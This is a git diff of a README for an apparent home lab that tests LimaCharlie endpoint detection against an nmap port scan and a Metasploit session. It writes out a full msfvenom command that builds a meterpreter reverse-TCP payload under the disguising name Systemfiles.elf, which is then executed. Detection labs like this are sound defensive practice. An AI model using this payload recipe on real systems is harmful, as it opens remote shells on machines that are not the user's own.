@@ -25,9 +25,7 @@ I configured and downloaded Limacharlie Endpoint detection and response to my Li
 I set up a port scan on my host with the command “nmap -p 21,22,23,25,53,80,443” and changing up to Limacharlie I was able to see the command being ran with the timeline feature. 
 
 
-
-
-
+![image alr](https://github.com/SavonMasters/Limacharlie-endpoint-investigation/blob/28830a7cecb88b3dc186c61b758cd00d0aa06fa6/Screenshot%20from%202026-05-26%2018-01-19.png)
 Now I initiated metaspoilt instructing msconsole to fix a reverse_tcp to my host “127.0.0.1” on port “4444” going on ahead I prompted msfvenom to download a payload to my host showing the command for a file“msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f elf > Systemfiles.elf” then made Systemfiles.elf an exe and executed it. 
 
 
